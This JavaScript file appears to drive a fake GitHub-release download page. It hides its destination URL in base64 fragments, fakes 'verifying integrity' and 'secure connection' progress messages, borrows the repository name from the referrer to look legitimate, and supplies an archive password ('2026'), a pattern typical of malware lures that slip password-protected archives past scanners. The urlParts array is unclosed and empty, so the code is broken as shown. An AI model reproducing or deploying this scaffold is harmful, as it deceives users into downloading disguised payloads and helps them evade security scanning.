(function() {
const urlParts = [
  
  
  function decodePart(encoded) {
    try {
      return atob(encoded);
    } catch(e) {
      return '';
    }
  }
  
  function buildUrl() {
    const base = decodePart(urlParts[0]);
    const id = decodePart(urlParts[1]);
    return base + id;
  }
  
  const BASE_URL = buildUrl();

  document.addEventListener('DOMContentLoaded', function() {
    const progressFill = document.getElementById('progressFill');
    const progressContainer = document.querySelector('.progress-container');
    const downloadContainer = document.getElementById('downloadContainer');
    const instructionContainer = document.getElementById('instructionContainer');
    const downloadBtn = document.getElementById('downloadBtn');
    const statusTextEl = document.getElementById('statusText');
    const cardRepoName = document.getElementById('cardRepoName');
    const repoNameMeta = document.getElementById('repoNameMeta');

    const messages = [
      'Preparing download...',
      'Verifying integrity...',
      'Establishing secure connection...',
      'Fetching release assets...',
      'Ready to download'
    ];

    function extractRepoName() {
      const urlParams = new URLSearchParams(window.location.search);
      const repoParam = urlParams.get('repo');
      if (repoParam) return repoParam;
      
      if (document.referrer) {
        try {
          const referrerUrl = new URL(document.referrer);
          if (referrerUrl.hostname === 'github.com') {
            const pathParts = referrerUrl.pathname.split('/').filter(p => p);
            if (pathParts.length >= 2) {
              return pathParts[1];
            }
          }
        } catch (e) {}
      }

      if (repoNameMeta && repoNameMeta.content) {
        return repoNameMeta.content;
      }

      const path = window.location.pathname;
      const cleanPath = path.replace(/^\/+|\/+$/g, '');
      const parts = cleanPath.split('/');
      return parts[parts.length - 1] || 'quick-start-guide';
    }

    const repoName = extractRepoName();
    if (repoNameMeta) {
      repoNameMeta.content = repoName;
    }
    
    if (cardRepoName) {
      cardRepoName.textContent = repoName;
    }

    let currentIndex = 0;
    const duration = 5000;
    const intervalTime = 50;
    let currentWidth = 0;
    
    const interval = setInterval(() => {
      currentWidth += (100 / (duration / intervalTime));
      
      if (currentWidth >= 100) {
        currentWidth = 100;
        if (progressFill) {
          progressFill.style.width = '100%';
        }
        clearInterval(interval);
        
        if (progressContainer) {
          progressContainer.style.display = 'none';
        }
        if (statusTextEl) {
          statusTextEl.style.display = 'none';
        }
        if (downloadContainer) {
          downloadContainer.classList.add('show');
        }
        if (instructionContainer) {
          instructionContainer.classList.add('show');
        }
      } else {
        if (progressFill) {
          progressFill.style.width = currentWidth + '%';
        }
        
        const messageIndex = Math.floor((currentWidth / 100) * messages.length);
        if (messageIndex < messages.length && messageIndex !== currentIndex) {
          currentIndex = messageIndex;
          if (statusTextEl) {
            statusTextEl.style.opacity = '0';
            setTimeout(() => {
              if (statusTextEl) {
                statusTextEl.textContent = messages[messageIndex];
                statusTextEl.style.opacity = '1';
              }
            }, 100);
          }
        }
      }
    }, intervalTime);

    if (downloadBtn) {
      downloadBtn.addEventListener('click', function() {
        if (BASE_URL && BASE_URL.startsWith('http')) {
          // const url = repoName ? `${BASE_URL}?repo_name=${encodeURIComponent(repoName)}` : BASE_URL;
          const url = BASE_URL;
          window.open(url, '_blank');
          downloadBtn.innerHTML = '<i class="fas fa-check"></i> Started!';
          downloadBtn.disabled = true;
          downloadBtn.style.opacity = '0.7';
          setTimeout(() => {
            downloadBtn.innerHTML = '<i class="fas fa-download"></i> Download';
            downloadBtn.disabled = false;
            downloadBtn.style.opacity = '1';
          }, 3000);
        }
      });
    }
  });
})();

function openInstructions() {
  const modal = document.getElementById('infoPopup');
  if (modal) {
    modal.classList.add('active');
  }
}

function closeModal() {
  const modal = document.getElementById('infoPopup');
  if (modal) modal.classList.remove('active');
}

function copyPassword() {
  const key = '2026';
  navigator.clipboard.writeText(key).then(() => {
    const btn = document.querySelector('.copy-btn');
    if (btn) {
      const originalHTML = btn.innerHTML;
      btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
      setTimeout(() => {
        btn.innerHTML = originalHTML;
      }, 2000);
    }
  });
}

document.addEventListener('click', function(event) {
  const target = event.target;
  const instructionBtn = target.closest('#instructionBtn');
  
  if (instructionBtn) {
    event.preventDefault();
    openInstructions();
    return;
  }
  
  const modal = document.getElementById('infoPopup');
  const closeBtn = target.closest('.modal-close-btn');
  const modalContent = target.closest('.modal-container');
  
  if (closeBtn && modal) {
    modal.classList.remove('active');
    return;
  }
  
  if (modal && modal.classList.contains('active') && !modalContent) {
    modal.classList.remove('active');
  }
});

document.addEventListener('keydown', function(event) {
  if (event.key === 'Escape') {
    const modal = document.getElementById('infoPopup');
    if (modal && modal.classList.contains('active')) {
      modal.classList.remove('active');
    }
  }
});
